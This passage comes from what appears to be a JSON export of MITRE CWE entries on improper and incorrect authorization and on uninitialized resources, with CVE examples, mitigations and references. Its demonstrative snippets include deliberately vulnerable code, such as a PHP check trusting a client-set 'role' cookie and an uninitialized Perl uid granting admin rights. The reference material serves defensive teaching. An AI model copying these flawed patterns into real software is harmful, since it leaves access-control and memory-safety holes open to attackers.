          "Description": "Gateway uses default \"Allow\" configuration for its authorization settings.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2213"
        },
        {
          "Reference": "CVE-2009-0034",
          "Description": "Chain: product does not properly interpret a configuration option for a system group, allowing users to gain privileges.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0034"
        },
        {
          "Reference": "CVE-2008-6123",
          "Description": "Chain: SNMP product does not properly parse a configuration option for which hosts are allowed to connect, allowing unauthorized IP addresses to connect.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-6123"
        },
        {
          "Reference": "CVE-2008-7109",
          "Description": "Chain: reliance on client-side security (CWE-602) allows attackers to bypass authorization using a custom client.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-7109"
        },
        {
          "Reference": "CVE-2008-3424",
          "Description": "Chain: product does not properly handle wildcards in an authorization policy list, allowing unintended access.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3424"
        },
        {
          "Reference": "CVE-2005-1036",
          "Description": "Chain: Bypass of access restrictions due to improper authorization (CWE-862) of a user results from an improperly initialized (CWE-909) I/O permission bitmap",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1036"
        },
        {
          "Reference": "CVE-2008-4577",
          "Description": "ACL-based protection mechanism treats negative access rights as if they are positive, allowing bypass of intended restrictions.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4577"
        },
        {
          "Reference": "CVE-2007-2925",
          "Description": "Default ACL list for a DNS server does not set certain ACLs, allowing unauthorized DNS queries.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-2925"
        },
        {
          "Reference": "CVE-2006-6679",
          "Description": "Product relies on the X-Forwarded-For HTTP header for authorization, allowing unintended access by spoofing the header.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6679"
        },
        {
          "Reference": "CVE-2005-3623",
          "Description": "OS kernel does not check for a certain privilege before setting ACLs for files.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3623"
        },
        {
          "Reference": "CVE-2005-2801",
          "Description": "Chain: file-system code performs an incorrect comparison (CWE-697), preventing default ACLs from being properly applied.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2801"
        },
        {
          "Reference": "CVE-2001-1155",
          "Description": "Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1155"
        },
        {
          "Reference": "CVE-2020-17533",
          "Description": "Chain: unchecked return value (CWE-252) of some functions for policy enforcement leads to authorization bypass (CWE-862)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-17533"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 2-1",
          "EntryName": "Req 4.3.3.7"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 3-3",
          "EntryName": "Req SR 2.1"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-2",
          "EntryName": "Req CR 2.1"
        }
      ],
      "RelatedAttackPatterns": [
        "665"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-229",
          "Authors": [
            "NIST"
          ],
          "Title": "Role Based Access Control and Role Based Security",
          "URL": "https://csrc.nist.gov/projects/role-based-access-control",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-7",
          "Section": "Chapter 4, \"Authorization\" Page 114; Chapter 6, \"Determining\n                  Appropriate Access Control\" Page 171",
          "Authors": [
            "Michael Howard",
            "David LeBlanc"
          ],
          "Title": "Writing Secure Code",
          "Edition": "2nd Edition",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "04",
          "Publisher": "Microsoft Press",
          "URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223"
        },
        {
          "ExternalReferenceID": "REF-231",
          "Authors": [
            "Frank Kim"
          ],
          "Title": "Top 25 Series - Rank 5 - Improper Access Control (Authorization)",
          "PublicationYear": "2010",
          "PublicationMonth": "03",
          "PublicationDay": "04",
          "Publisher": "SANS Software Security Institute",
          "URL": "https://www.sans.org/blog/top-25-series-rank-5-improper-access-control-authorization/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-45",
          "Authors": [
            "OWASP"
          ],
          "Title": "OWASP Enterprise Security API (ESAPI) Project",
          "URL": "http://www.owasp.org/index.php/ESAPI"
        },
        {
          "ExternalReferenceID": "REF-233",
          "Authors": [
            "Rahul Bhattacharjee"
          ],
          "Title": "Authentication using JAAS",
          "URL": "https://javaranch.com/journal/2008/04/authentication-using-JAAS.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 2, \"Common Vulnerabilities of Authorization\", Page 39",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "863",
      "Name": "Incorrect Authorization",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check. This allows attackers to bypass intended access restrictions.",
      "ExtendedDescription": "\n\nAssuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.\n\n\nWhen access control checks are incorrectly applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.\n",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "285",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "284",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Name": "Web Server",
          "Prevalence": "Often"
        },
        {
          "Type": "Technology",
          "Name": "Database Server",
          "Prevalence": "Often"
        }
      ],
      "BackgroundDetails": [
        "An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: \"No access\", \"Read access\", \"Change access\", and \"Full control\". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object."
      ],
      "AlternateTerms": [
        {
          "Term": "AuthZ",
          "Description": "\"AuthZ\" is typically used as an abbreviation of \"authorization\" within the web application security community. It is distinct from \"AuthN\" (or, sometimes, \"AuthC\") which is an abbreviation of \"authentication.\" The use of \"Auth\" as an abbreviation is discouraged, since it could be used for either authentication or authorization."
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "Authorization weaknesses may arise when a single-user application is ported to a multi-user environment."
        },
        {
          "Phase": "Implementation",
          "Note": "\n\nREALIZATION: This weakness is caused during implementation of an architectural security tactic.\n\n\nA developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies.\n"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data",
            "Read Files or Directories"
          ],
          "Note": "An attacker could read sensitive data, either by reading the data directly from a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to read the data."
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data",
            "Modify Files or Directories"
          ],
          "Note": "An attacker could modify sensitive data, either by writing the data directly to a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to write the data."
        },
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity",
            "Bypass Protection Mechanism"
          ],
          "Note": "An attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-6",
          "Method": "Automated Static Analysis",
          "Description": "\n\nAutomated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.\n\n\nGenerally, automated static analysis tools have difficulty detecting custom authorization schemes. Even if they can be customized to recognize these schemes, they might not be able to tell whether the scheme correctly performs the authorization in a way that cannot be bypassed or subverted by an attacker.\n",
          "Effectiveness": "Limited"
        },
        {
          "Method": "Automated Dynamic Analysis",
          "Description": "Automated dynamic analysis may not be able to find interfaces that are protected by authorization checks, even if those checks contain weaknesses."
        },
        {
          "Method": "Manual Analysis",
          "Description": "\n\nThis weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.\n\n\nSpecifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.\n",
          "Effectiveness": "Moderate",
          "EffectivenessNotes": "These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints."
        },
        {
          "Method": "Manual Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Dynamic Analysis with Automated Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tWeb Application Scanner\n\t\tWeb Services Scanner\n\t\tDatabase Scanners",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Dynamic Analysis with Manual Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tHost Application Interface Scanner\n\t\tFuzz Tester\n\t\tFramework-based Fuzzer\n\t\tForced Path Execution\n\t\tMonitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source\n\t\tManual Source Code Review (not inspections)",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Automated Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tContext-configured Source Code Weakness Analyzer",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFormal Methods / Correct-By-Construction\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "\n\nDivide the product into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.\n\n\nNote that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7]."
        },
        {
          "MitigationID": "MIT-4.4",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Libraries or Frameworks",
          "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nFor example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "\n\nFor web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.\n\n\nOne way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.\n"
        },
        {
          "Phase": [
            "System Configuration",
            "Installation"
          ],
          "Description": "Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a \"default deny\" policy when defining these ACLs."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following code could be for a medical records application. It displays a record to already authenticated users, confirming the user's authorization using a value stored in a cookie."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t$role = $_COOKIES['role'];\n\tif (!$role) {\n\t\t$role = getRole('user');\n\t\tif ($role) {\n\t\t\t// save the cookie to send out in future responses\n\t\t\tsetcookie(\"role\", $role, time()+60*60*2);\n\t\t}\n\t\telse{\n\t\t\tShowLoginScreen();\n\t\t\tdie(\"\\n\");\n\t\t}\n\t}\n\tif ($role == 'Reader') {\n\t\tDisplayMedicalHistory($_POST['patient_ID']);\n\t}\n\telse{\n\t\tdie(\"You are not Authorized to view this record\\n\");\n\t}\n```"
            },
            {
              "BodyText": "The programmer expects that the cookie will only be set when getRole() succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie. However, the attacker can easily set the \"role\" cookie to the value \"Reader\". As a result, the $role variable is \"Reader\", and getRole() is never invoked. The attacker has bypassed the authorization system."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2021-39155",
          "Description": "Chain: A microservice integration and management platform compares the hostname in the HTTP Host header in a case-sensitive way (CWE-178, CWE-1289), allowing bypass of the authorization policy (CWE-863) using a hostname with mixed case or other variations.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-39155"
        },
        {
          "Reference": "CVE-2019-15900",
          "Description": "Chain: sscanf() call is used to check if a username and group exists, but the return value of sscanf() call is not checked (CWE-252), causing an uninitialized variable to be checked (CWE-457), returning success to allow authorization bypass for executing a privileged (CWE-863).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2019-15900"
        },
        {
          "Reference": "CVE-2009-2213",
          "Description": "Gateway uses default \"Allow\" configuration for its authorization settings.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2213"
        },
        {
          "Reference": "CVE-2009-0034",
          "Description": "Chain: product does not properly interpret a configuration option for a system group, allowing users to gain privileges.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0034"
        },
        {
          "Reference": "CVE-2008-6123",
          "Description": "Chain: SNMP product does not properly parse a configuration option for which hosts are allowed to connect, allowing unauthorized IP addresses to connect.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-6123"
        },
        {
          "Reference": "CVE-2008-7109",
          "Description": "Chain: reliance on client-side security (CWE-602) allows attackers to bypass authorization using a custom client.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-7109"
        },
        {
          "Reference": "CVE-2008-3424",
          "Description": "Chain: product does not properly handle wildcards in an authorization policy list, allowing unintended access.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3424"
        },
        {
          "Reference": "CVE-2008-4577",
          "Description": "ACL-based protection mechanism treats negative access rights as if they are positive, allowing bypass of intended restrictions.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4577"
        },
        {
          "Reference": "CVE-2006-6679",
          "Description": "Product relies on the X-Forwarded-For HTTP header for authorization, allowing unintended access by spoofing the header.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6679"
        },
        {
          "Reference": "CVE-2005-2801",
          "Description": "Chain: file-system code performs an incorrect comparison (CWE-697), preventing default ACLs from being properly applied.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2801"
        },
        {
          "Reference": "CVE-2001-1155",
          "Description": "Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1155"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SD-4"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-2",
          "EntryName": "Req CR 2.1"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-2",
          "EntryName": "Req CR 2.2"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 3-3",
          "EntryName": "Req SR 2.1"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 3-3",
          "EntryName": "Req SR 2.2"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SVV-1"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SVV-4"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SD-1"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-229",
          "Authors": [
            "NIST"
          ],
          "Title": "Role Based Access Control and Role Based Security",
          "URL": "https://csrc.nist.gov/projects/role-based-access-control",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-7",
          "Section": "Chapter 4, \"Authorization\" Page 114; Chapter 6, \"Determining\n                  Appropriate Access Control\" Page 171",
          "Authors": [
            "Michael Howard",
            "David LeBlanc"
          ],
          "Title": "Writing Secure Code",
          "Edition": "2nd Edition",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "04",
          "Publisher": "Microsoft Press",
          "URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223"
        },
        {
          "ExternalReferenceID": "REF-231",
          "Authors": [
            "Frank Kim"
          ],
          "Title": "Top 25 Series - Rank 5 - Improper Access Control (Authorization)",
          "PublicationYear": "2010",
          "PublicationMonth": "03",
          "PublicationDay": "04",
          "Publisher": "SANS Software Security Institute",
          "URL": "https://www.sans.org/blog/top-25-series-rank-5-improper-access-control-authorization/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-233",
          "Authors": [
            "Rahul Bhattacharjee"
          ],
          "Title": "Authentication using JAAS",
          "URL": "https://javaranch.com/journal/2008/04/authentication-using-JAAS.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-45",
          "Authors": [
            "OWASP"
          ],
          "Title": "OWASP Enterprise Security API (ESAPI) Project",
          "URL": "http://www.owasp.org/index.php/ESAPI"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 2, \"Common Vulnerabilities of Authorization\", Page 39",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "908",
      "Name": "Use of Uninitialized Resource",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses or accesses a resource that has not been initialized.",
      "ExtendedDescription": "When a resource has not been properly initialized, the product may behave unexpectedly. This may lead to a crash or invalid memory access, but the consequences vary depending on the type of resource and how it is used within the product.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "665",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "665",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        },
        {
          "Ordinality": "Resultant"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Memory",
            "Read Application Data"
          ],
          "Note": "When reusing a resource such as memory or a program variable, the original contents of that resource may not be cleared before it is sent to an untrusted party."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "The uninitialized resource may contain values that cause program flow to change in ways that the programmer did not intend."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Explicitly initialize the resource before use. If this is performed through an API function or standard procedure, follow all required steps."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Pay close attention to complex conditionals that affect initialization, since some branches might not perform the initialization."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Avoid race conditions (CWE-362) during initialization routines."
        },
        {
          "Phase": [
            "Build and Compilation"
          ],
          "Description": "Run or compile the product with settings that generate warnings about uninitialized variables or data."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-105",
          "Entries": [
            {
              "IntroText": "Here, a boolean initiailized field is consulted to ensure that initialization tasks are only completed once. However, the field is mistakenly set to true during static initialization, so the initialization code is never reached."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tprivate boolean initialized = true;\n\tpublic void someMethod() {\n\t\t\tif (!initialized) {\n```\n// perform initialization tasks* \n\t\t\t\t\t...\n\t\t\t\t\t\n\t\t\t\t\tinitialized = true;}"
            }
          ]
        },
        {
          "ID": "DX-54",
          "Entries": [
            {
              "IntroText": "The following code intends to limit certain operations to the administrator only."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\t$username = GetCurrentUser();\n\t$state = GetStateData($username);\n\tif (defined($state)) {\n\t\t$uid = ExtractUserID($state);\n\t}\n```\n# do stuff* \n\tif ($uid == 0) {\n\t```\n\t\tDoAdminThings();\n\t}\n```"
            },
            {
              "BodyText": "If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to \"0\" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident."
            }
          ]
        },
        {
          "ID": "DX-106",
          "Entries": [
            {
              "IntroText": "The following code intends to concatenate a string to a variable and print the string."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar str[20];\n\tstrcat(str, \"hello world\");\n\tprintf(\"%s\", str);\n```"
            },
            {
              "BodyText": "This might seem innocent enough, but str was not initialized, so it contains random memory. As a result, str[0] might not contain the null terminator, so the copy might start at an offset other than 0. The consequences can vary, depending on the underlying memory."
            },
            {
              "BodyText": "If a null terminator is found before str[8], then some bytes of random garbage will be printed before the \"hello world\" string. The memory might contain sensitive information from previous uses, such as a password (which might occur as a result of CWE-14 or CWE-244). In this example, it might not be a big deal, but consider what could happen if large amounts of memory are printed out before the null terminator is found."
            },
            {
              "BodyText": "If a null terminator isn't found before str[8], then a buffer overflow could occur, since strcat will first look for the null terminator, then copy 12 bytes starting with that location. Alternately, a buffer over-read might occur (CWE-126) if a null terminator isn't found before the end of the memory segment is reached, leading to a segmentation fault and crash."
            }
          ]
        },
        {
          "ID": "DX-144",
          "Entries": [
            {
              "IntroText": "This example will leave test_string in an unknown condition when i is the same value as err_val, because test_string is not initialized (CWE-456). Depending on where this code segment appears (e.g. within a function body), test_string might be random if it is stored on the heap or stack. If the variable is declared in static memory, it might be zero or NULL. Compiler optimization might contribute to the unpredictability of this address."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "char *test_string;\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n printf(\"%s\", test_string);\n```"
            },
            {
              "BodyText": "When the printf() is reached, test_string might be an unexpected address, so the printf might print junk strings (CWE-457).\n\n\n To fix this code, there are a couple approaches to making sure that test_string has been properly set once it reaches the printf().\n\n\nOne solution would be to set test_string to an acceptable default before the conditional:"
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "char *test_string = \"Done at the beginning\";\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n printf(\"%s\", test_string);\n```"
            },
            {
              "BodyText": "Another solution is to ensure that each branch of the conditional - including the default/else branch - could ensure that test_string is set:"
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "char *test_string;\n if (i != err_val)\n {\n\n```\n\ttest_string = \"Hello World!\";\n }\n else {\n\ttest_string = \"Done on the other side!\";\n }\n printf(\"%s\", test_string);\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2019-9805",
          "Description": "Chain: Creation of the packet client occurs before initialization is complete (CWE-696) resulting in a read from uninitialized memory (CWE-908), causing memory corruption.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2019-9805"
        },
        {
          "Reference": "CVE-2008-4197",
          "Description": "Use of uninitialized memory may allow code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4197"
        },
        {
          "Reference": "CVE-2008-2934",
          "Description": "Free of an uninitialized pointer leads to crash and possible code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2934"
        },
        {
          "Reference": "CVE-2008-0063",
          "Description": "Product does not clear memory contents when generating an error message, leading to information leak.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0063"
        },
        {
          "Reference": "CVE-2008-0062",
          "Description": "Lack of initialization triggers NULL pointer dereference or double-free.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0062"
        },
        {
          "Reference": "CVE-2008-0081",
          "Description": "Uninitialized variable leads to code execution in popular desktop application.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0081"
        },
        {
          "Reference": "CVE-2008-3688",
          "Description": "Chain: Uninitialized variable leads to infinite loop.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3688"
        },
        {
          "Reference": "CVE-2008-3475",
          "Description": "Chain: Improper initialization leads to memory corruption.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3475"
        },
        {
          "Reference": "CVE-2005-1036",
          "Description": "Chain: Bypass of access restrictions due to improper authorization (CWE-862) of a user results from an improperly initialized (CWE-909) I/O permission bitmap",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1036"
        },
        {
          "Reference": "CVE-2008-3597",
          "Description": "Chain: game server can access player data structures before initialization has happened leading to NULL dereference",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3597"
        },
        {
          "Reference": "CVE-2009-2692",
          "Description": "Chain: uninitialized function pointers can be dereferenced allowing code execution",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2692"
        },
        {
          "Reference": "CVE-2009-0949",
          "Description": "Chain: improper initialization of memory can lead to NULL dereference",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0949"
        },
        {
          "Reference": "CVE-2009-3620",
          "Description": "Chain: some unprivileged ioctls do not verify that a structure has been initialized before invocation, leading to NULL dereference",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3620"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "EXP33-C",
          "EntryName": "Do not read uninitialized memory",
          "MappingFit": "CWE More Abstract"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-436",
          "Authors": [
            "mercy"
          ],
          "Title": "Exploiting Uninitialized Data",
          "PublicationYear": "2006",
          "PublicationMonth": "01",
          "URL": "http://www.felinemenace.org/~mercy/papers/UBehavior/UBehavior.zip"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "909",
      "Name": "Missing Initialization of Resource",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not initialize a critical resource.",
      "ExtendedDescription": "Many resources require initialization before they can be properly used. If a resource is not initialized, it could contain unpredictable or expired data, or it could be initialized to defaults that are invalid. This can have security implications when the resource is expected to have certain properties or values.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "665",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "665",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "908",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
